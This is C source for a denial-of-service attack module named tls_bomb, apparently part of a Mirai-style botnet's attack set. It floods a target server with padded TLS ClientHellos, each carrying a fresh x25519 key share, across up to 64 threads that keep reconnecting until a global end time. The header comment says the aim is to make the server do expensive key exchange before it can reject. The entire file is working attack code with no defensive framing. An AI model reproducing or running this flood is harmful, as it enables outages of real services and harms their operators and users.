#ifdef ANDROID
#include "android_compat.h"
#endif
#include <pthread.h>
/*
 * tls_bomb.c — TLS handshake exhaustion flood
 * Sends oversized ClientHello with fresh x25519 keypair each time.
 * Server must do expensive ECDH before it can reject.
 */

#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <poll.h>

#include "tls_bomb.h"
#include "x25519.h"
#include "rand.h"
#include "util.h"

extern volatile time_t g_atk_end_time;

#define TLSBOMB_THREADS 32

typedef struct {
    struct sockaddr_in dst;
    int pad_len;
    int hellos_per_conn;
    char sni[256];
    volatile int *counter;
} tlsbomb_ctx;

/* Build ClientHello with padding */
static int build_hello(uint8_t *buf, const char *sni, int pad_len) {
    uint8_t pub[32], priv[32];
    x25519_gen_keypair(pub, priv);

    int off = 0;

    /* TLS Record header placeholder */
    buf[off++] = 0x16; /* Handshake */
    buf[off++] = 0x03; buf[off++] = 0x01; /* TLS 1.0 */
    int rec_len_pos = off; off += 2;

    /* Handshake header */
    buf[off++] = 0x01; /* ClientHello */
    int hs_len_pos = off; off += 3;

    /* Version */
    buf[off++] = 0x03; buf[off++] = 0x03; /* TLS 1.2 */

    /* Random (32 bytes) */
    for (int i = 0; i < 32; i++) buf[off++] = rand_next() & 0xff;

    /* Session ID (32 bytes) */
    buf[off++] = 32;
    for (int i = 0; i < 32; i++) buf[off++] = rand_next() & 0xff;

    /* Cipher suites */
    buf[off++] = 0x00; buf[off++] = 0x08;
    buf[off++] = 0x13; buf[off++] = 0x01; /* TLS_AES_128_GCM_SHA256 */
    buf[off++] = 0x13; buf[off++] = 0x02; /* TLS_AES_256_GCM_SHA384 */
    buf[off++] = 0x13; buf[off++] = 0x03; /* TLS_CHACHA20_POLY1305_SHA256 */
    buf[off++] = 0x00; buf[off++] = 0xff;

    /* Compression */
    buf[off++] = 0x01; buf[off++] = 0x00;

    /* Extensions length placeholder */
    int ext_len_pos = off; off += 2;
    int ext_start = off;

    /* SNI extension */
    if (sni && sni[0]) {
        int sni_len = strlen(sni);
        buf[off++] = 0x00; buf[off++] = 0x00; /* type */
        buf[off++] = ((sni_len + 5) >> 8) & 0xff;
        buf[off++] = (sni_len + 5) & 0xff;
        buf[off++] = ((sni_len + 3) >> 8) & 0xff;
        buf[off++] = (sni_len + 3) & 0xff;
        buf[off++] = 0x00;
        buf[off++] = (sni_len >> 8) & 0xff;
        buf[off++] = sni_len & 0xff;
        memcpy(buf + off, sni, sni_len); off += sni_len;
    }

    /* Supported versions */
    buf[off++] = 0x00; buf[off++] = 0x2b;
    buf[off++] = 0x00; buf[off++] = 0x03;
    buf[off++] = 0x02; buf[off++] = 0x03; buf[off++] = 0x04;

    /* Supported groups */
    buf[off++] = 0x00; buf[off++] = 0x0a;
    buf[off++] = 0x00; buf[off++] = 0x04;
    buf[off++] = 0x00; buf[off++] = 0x02;
    buf[off++] = 0x00; buf[off++] = 0x1d; /* x25519 */

    /* Key share (x25519) */
    buf[off++] = 0x00; buf[off++] = 0x33;
    buf[off++] = 0x00; buf[off++] = 0x26;
    buf[off++] = 0x00; buf[off++] = 0x24;
    buf[off++] = 0x00; buf[off++] = 0x1d;
    buf[off++] = 0x00; buf[off++] = 0x20;
    memcpy(buf + off, pub, 32); off += 32;

    /* Padding extension */
    if (pad_len > 0) {
        buf[off++] = 0x00; buf[off++] = 0x15;
        buf[off++] = (pad_len >> 8) & 0xff;
        buf[off++] = pad_len & 0xff;
        memset(buf + off, 0, pad_len); off += pad_len;
    }

    /* Fix lengths */
    int ext_len = off - ext_start;
    buf[ext_len_pos] = (ext_len >> 8) & 0xff;
    buf[ext_len_pos + 1] = ext_len & 0xff;

    int hs_len = off - hs_len_pos - 3;
    buf[hs_len_pos] = (hs_len >> 16) & 0xff;
    buf[hs_len_pos + 1] = (hs_len >> 8) & 0xff;
    buf[hs_len_pos + 2] = hs_len & 0xff;

    int rec_len = off - 5;
    buf[rec_len_pos] = (rec_len >> 8) & 0xff;
    buf[rec_len_pos + 1] = rec_len & 0xff;

    return off;
}

static void *tlsbomb_thread(void *arg) {
    tlsbomb_ctx *ctx = (tlsbomb_ctx *)arg;
    uint8_t buf[16384];

    while (g_atk_end_time == 0 || time(NULL) < g_atk_end_time) {
        int fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd < 0) continue;

        fcntl(fd, F_SETFL, O_NONBLOCK);
        connect(fd, (struct sockaddr *)&ctx->dst, sizeof(ctx->dst));

        struct pollfd pfd = {fd, POLLOUT, 0};
        if (poll(&pfd, 1, 1000) <= 0) { close(fd); continue; }

        int err = 0; socklen_t el = sizeof(err);
        if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &el) < 0 || err) {
            close(fd); continue;
        }

        /* Disable Nagle */
        int one = 1;
        setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));

        /* Send multiple ClientHellos */
        for (int i = 0; i < ctx->hellos_per_conn; i++) {
            int len = build_hello(buf, ctx->sni, ctx->pad_len);
            if (send(fd, buf, len, MSG_NOSIGNAL) <= 0) break;
            if (ctx->counter) __sync_fetch_and_add(ctx->counter, 1);
        }

        close(fd);
    }
    return NULL;
}

void attack_tls_bomb(uint8_t targs_len, struct attack_target *targs,
                     uint8_t opts_len, struct attack_option *opts)
{
    int dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 443);
    char *sni = attack_get_opt_str(opts_len, opts, ATK_OPT_HTTP_DOMAIN, NULL);
    int pad_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 8192);
    int hellos = attack_get_opt_int(opts_len, opts, ATK_OPT_AGGRESSIVE, 16);
    int threads = attack_get_opt_int(opts_len, opts, ATK_OPT_HTTP_CONNS, TLSBOMB_THREADS);

    if (pad_len < 0) pad_len = 0;
    if (pad_len > 14000) pad_len = 14000;
    if (hellos < 1) hellos = 1;
    if (hellos > 64) hellos = 64;
    if (threads < 1) threads = 1;
    if (threads > 64) threads = 64;

    volatile int counter = 0;
    tlsbomb_ctx ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.dst.sin_family = AF_INET;
    ctx.dst.sin_port = htons(dport);
    ctx.dst.sin_addr.s_addr = targs[0].addr;
    ctx.pad_len = pad_len;
    ctx.hellos_per_conn = hellos;
    ctx.counter = &counter;
    if (sni) util_strcpy(ctx.sni, sni);

    pthread_t t[64];
    for (int i = 0; i < threads; i++) {
        pthread_create(&t[i], NULL, tlsbomb_thread, &ctx);
    }

    while (g_atk_end_time == 0 || time(NULL) < g_atk_end_time) {
        sleep(1);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(t[i], NULL);
    }
}
